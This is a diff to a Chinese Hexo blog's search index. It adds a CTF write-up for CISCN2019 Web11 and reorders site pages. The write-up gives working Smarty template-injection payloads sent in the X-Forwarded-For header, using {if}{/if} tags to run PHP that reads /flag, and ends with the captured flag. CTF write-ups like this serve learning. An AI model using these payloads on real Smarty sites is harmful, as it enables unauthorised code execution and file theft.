@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>[CISCN2019华东南赛区]Web11</title>
+      <link href="/2020/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/"/>
+      <url>/2020/08/23/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11/</url>
+      
+        <content type="html"><![CDATA[<p>太难了，菜的找屎吃。还是恢复更新博客吧，前一段时间的wp全弄到本地笔记上去了，图片在本地不是很好放，还是都放到github备份吧。。。</p><h3 id="1-smarty模板注入"><a href="#1-smarty模板注入" class="headerlink" title="1.smarty模板注入"></a>1.smarty模板注入</h3><p>这个原来拿着下面的提示百度的时候，搜smarty漏洞，出来了命令执行，后来发现命令执行用不了(应该是版本问题)。然后看到了ssti，x最后发现是X-Forwarded-For模板注入，<br>测试payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: &#123;7+7&#125;</span><br></pre></td></tr></table></figure><p>返回的ip地址为14，存在模板注入，然后看smarty的手册，</p><h3 id="2-cat-flag"><a href="#2-cat-flag" class="headerlink" title="2.cat /flag"></a>2.cat /flag</h3><p>{if}{/if}标签可以执行php代码，但是必须这样使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p>不能使用分号<code>;</code>，使用分号也会报错，最后用下面的payload<code>cat /flag</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;if var_dump(file_get_contents(&#39;&#x2F;flag&#39;))&#125;&#123;&#x2F;if&#125;</span><br><span class="line">或</span><br><span class="line">X-Forwarded-For:&#123;if print_r(file_get_contents(&#39;&#x2F;flag&#39;))&#125;&#123;&#x2F;if&#125;</span><br><span class="line">或</span><br><span class="line">X-Forwarded-For:&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><h3 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;00c792cb-78e4-4323-89ca-2e8dc234931e&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> smarty模板注入 </tag>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>post[BJDCTF2020]EasySearch</title>
       <link href="/2020/07/31/post-BJDCTF2020-EasySearch/"/>
       <url>/2020/07/31/post-BJDCTF2020-EasySearch/</url>
@@ -969,9 +990,9 @@
     
     
     <entry>
-      <title>友情链接</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
+      <title>archives</title>
+      <link href="/archives/index.html"/>
+      <url>/archives/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -980,9 +1001,20 @@
     
     
     <entry>
-      <title>archives</title>
-      <link href="/archives/index.html"/>
-      <url>/archives/index.html</url>
+      <title>tags</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[<p>阅读以下标签</p>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>友情链接</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -996,17 +1028,6 @@
       <url>/pictures/index.html</url>
       
         <content type="html"><![CDATA[<div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-src='/gallery/mypaint/%E6%84%A4%E6%80%92%E7%9A%84%E5%B0%8F%E9%B8%9F.png'>  <figcaption>  <div class="gallery-group-name">我的绘画</div>  <p>幼儿园级别的画</p>  <a href='/pictures/mypaint'></a>  </figcaption>  </figure>  </div>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>tags</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
-      
-        <content type="html"><![CDATA[<p>阅读以下标签</p>]]></content>
       
     </entry>
     
